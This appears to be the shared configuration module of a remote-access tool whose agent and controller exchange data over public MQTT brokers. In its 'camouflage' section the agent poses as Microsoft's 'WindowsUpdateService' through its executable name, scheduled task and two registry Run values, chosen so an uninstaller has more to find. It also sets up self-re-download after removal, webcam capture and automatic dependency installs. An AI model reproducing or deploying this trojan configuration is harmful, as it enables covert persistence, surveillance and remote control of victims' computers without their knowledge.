"""Shared configuration.

Both the agent and the controller import this module, so every value here is
part of the wire contract.  Change them in one place and both sides follow.
"""

from __future__ import annotations

import os
import re
import socket
import uuid

# --------------------------------------------------------------------------
# Identity of this deployment
# --------------------------------------------------------------------------

#: MQTT topic prefix.  Make this unique or strangers will see your traffic.
ROOM = "syspy-delta-7421"

#: Pre-shared passphrase.  Both sides derive the same key from it.
PASSPHRASE = "k9Xq2-venice-syspy"

#: Salt mixed into the key derivation.  Changing it invalidates all peers.
KEY_SALT = b"syspy/v3/transport"

# --------------------------------------------------------------------------
# Transport
# --------------------------------------------------------------------------

#: Public brokers, tried in order.  ``(host, port, use_tls)``.
BROKERS: list[tuple[str, int, bool]] = [
    ("broker.emqx.io", 8883, True),
    ("broker.hivemq.com", 1883, False),
    ("test.mosquitto.org", 1883, False),
    ("broker.emqx.io", 1883, False),
]

MQTT_KEEPALIVE = 30
MQTT_RECONNECT_DELAY = 5.0

#: Maximum bytes per chunk when splitting large payloads (32 KB safe under 64 KB public MQTT limits).
CHUNK_SIZE = 32_000

#: Automatically install missing dependencies on demand (e.g. OpenCV for webcam).
AUTO_INSTALL_DEPS = True

#: Seconds between telemetry pushes.
TELEMETRY_INTERVAL = 3.0

#: Seconds between agent heartbeats.
HEARTBEAT_INTERVAL = 10.0

#: Seconds before the controller considers an agent gone.
AGENT_TIMEOUT = 45.0

# --------------------------------------------------------------------------
# Dashboard
# --------------------------------------------------------------------------

DASHBOARD_HOST = "127.0.0.1"
DASHBOARD_PORT = 8787

# --------------------------------------------------------------------------
# Naming / camouflage
# --------------------------------------------------------------------------

#: Name used for the executable, the scheduled task and the registry value.
PRODUCT_NAME = "WindowsUpdateService"

#: Human readable description shown in Task Manager / service lists.
PRODUCT_DESCRIPTION = "Microsoft Windows Update Service"

#: Sub-path used under the standard Windows data folders.
WINDOWS_SUBDIR = os.path.join("Microsoft", "WindowsUpdate")

#: Folder used on Linux/macOS.
UNIX_SUBDIR = os.path.join(".local", "share", "windows-update-service")

#: Registry value names that point at us.  Two independent names is one more
#: thing an uninstaller has to find.
RUN_VALUE_NAMES = ("WindowsUpdateService", "MicrosoftEdgeUpdate")

#: Scheduled task name.
TASK_NAME = "WindowsUpdateService"

#: Optional.  If set, the agent re-downloads itself when every copy is gone.
REMOTE_URL = ""

# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------


def agent_id() -> str:
    """Return a stable, filesystem-safe identifier for this machine.

    Derived from the hostname so it is recognisable, with a short random
    suffix so two machines with the same name do not collide.
    """
    host = re.sub(r"[^A-Za-z0-9_-]", "-", socket.gethostname())[:20] or "host"
    return f"{host}-{uuid.getnode() % 0x10000:04x}"


def broker_order() -> list[tuple[str, int, bool]]:
    """Return the broker list with TLS entries first."""
    return sorted(BROKERS, key=lambda entry: not entry[2])


def topic_up(agent: str) -> str:
    """Topic the agent publishes on."""
    return f"{ROOM}/up/{agent}"


def topic_down(agent: str) -> str:
    """Topic the controller publishes on."""
    return f"{ROOM}/down/{agent}"
